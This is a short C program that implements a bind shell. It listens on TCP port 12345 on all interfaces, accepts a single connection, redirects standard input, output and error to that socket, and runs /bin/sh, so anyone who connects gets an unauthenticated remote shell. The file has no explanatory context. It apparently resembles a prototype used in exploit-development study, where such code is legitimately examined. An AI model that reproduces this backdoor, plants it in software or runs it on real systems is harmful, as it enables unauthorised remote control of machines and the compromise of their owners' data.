#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
 
int sockfd, cli;
struct sockaddr_in serv_addr;
 
int main()
{ 
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = INADDR_ANY;
	serv_addr.sin_port = htons(12345);
	sockfd = socket(AF_INET,SOCK_STREAM,0);
	bind(sockfd,(struct sockaddr *) &serv_addr, 0x10);
	listen(sockfd, 1);
	cli = accept(sockfd, 0, 0);
	dup2(cli, 0);
	dup2(cli, 1);
	dup2(cli, 2);
	execve("/bin/sh", 0, 0);
}
